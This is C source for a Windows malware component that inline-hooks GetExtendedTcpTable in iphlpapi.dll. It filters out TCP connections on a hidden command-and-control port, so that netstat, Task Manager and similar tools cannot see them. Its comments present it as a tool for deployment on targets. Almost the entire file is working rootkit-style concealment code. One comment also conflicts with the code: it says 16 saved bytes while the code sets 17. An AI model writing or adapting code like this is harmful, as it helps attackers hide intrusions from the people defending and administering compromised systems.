/*
 * hide_connection.c — Network Connection Concealment
 * 22DIV / george wu
 *
 * Hooks GetExtendedTcpTable (iphlpapi.dll) to filter TCP connections
 * matching the C2 port. netstat, Task Manager network tab, and any
 * tool using this API will not see the hidden connections.
 *
 * Uses IAT-independent inline hook on iphlpapi!GetExtendedTcpTable.
 * The first 16 bytes of this function are saved and trampolined.
 *
 * NOTE: iphlpapi function prologues are NOT NT stubs — their byte
 * pattern varies. We save 16 bytes which covers common prologues
 * (sub rsp,28h + mov reg,... = 4+3+... bytes). If a specific Windows
 * build has a different prologue, the hook may crash that process.
 * Test on target build before deployment.
 */

#include <windows.h>
#include <iphlpapi.h>
#include <tcpmib.h>
#include "hook_engine.h"
#include "cloak.h"

typedef DWORD (WINAPI *pfnGetExtendedTcpTable)(
    PVOID pTcpTable, PDWORD pdwSize, BOOL bOrder,
    ULONG ulAf, ULONG TableClass, ULONG Reserved
);

HOOK_ENTRY g_hook_tcp = {0};

static DWORD WINAPI hook_GetExtendedTcpTable(
    PVOID pTcpTable, PDWORD pdwSize, BOOL bOrder,
    ULONG ulAf, ULONG TableClass, ULONG Reserved
) {
    pfnGetExtendedTcpTable orig =
        (pfnGetExtendedTcpTable)g_hook_tcp.trampoline;

    DWORD ret = orig(pTcpTable, pdwSize, bOrder, ulAf, TableClass, Reserved);
    if (ret != NO_ERROR || !pTcpTable)
        return ret;

    if (ulAf == AF_INET && TableClass == TCP_TABLE_OWNER_PID_ALL) {
        MIB_TCPTABLE_OWNER_PID *table = (MIB_TCPTABLE_OWNER_PID *)pTcpTable;
        DWORD i = 0;
        while (i < table->dwNumEntries) {
            DWORD localPort  = ntohs((u_short)table->table[i].dwLocalPort);
            DWORD remotePort = ntohs((u_short)table->table[i].dwRemotePort);

            if (localPort == HIDDEN_C2_PORT || remotePort == HIDDEN_C2_PORT) {
                DWORD remaining = table->dwNumEntries - i - 1;
                if (remaining > 0) {
                    memmove(&table->table[i], &table->table[i + 1],
                            remaining * sizeof(MIB_TCPROW_OWNER_PID));
                }
                table->dwNumEntries--;
            } else {
                i++;
            }
        }
    }

    if (ulAf == AF_INET && TableClass == TCP_TABLE_OWNER_PID_CONNECTIONS) {
        MIB_TCPTABLE_OWNER_PID *table = (MIB_TCPTABLE_OWNER_PID *)pTcpTable;
        DWORD i = 0;
        while (i < table->dwNumEntries) {
            DWORD remotePort = ntohs((u_short)table->table[i].dwRemotePort);
            if (remotePort == HIDDEN_C2_PORT) {
                DWORD remaining = table->dwNumEntries - i - 1;
                if (remaining > 0) {
                    memmove(&table->table[i], &table->table[i + 1],
                            remaining * sizeof(MIB_TCPROW_OWNER_PID));
                }
                table->dwNumEntries--;
            } else {
                i++;
            }
        }
    }

    return ret;
}

BOOL install_connection_hook(void) {
    HMODULE iphlp = LoadLibraryA("iphlpapi.dll");
    if (!iphlp) return FALSE;

    g_hook_tcp.target         = GetProcAddress(iphlp, "GetExtendedTcpTable");
    g_hook_tcp.hook           = hook_GetExtendedTcpTable;
    g_hook_tcp.save_size      = 17;
    g_hook_tcp.self_contained = FALSE;  /* not an NT stub — JMP back to iphlpapi */

    if (!g_hook_tcp.target) return FALSE;
    return hook_install(&g_hook_tcp);
}

void remove_connection_hook(void) {
    hook_remove(&g_hook_tcp);
}
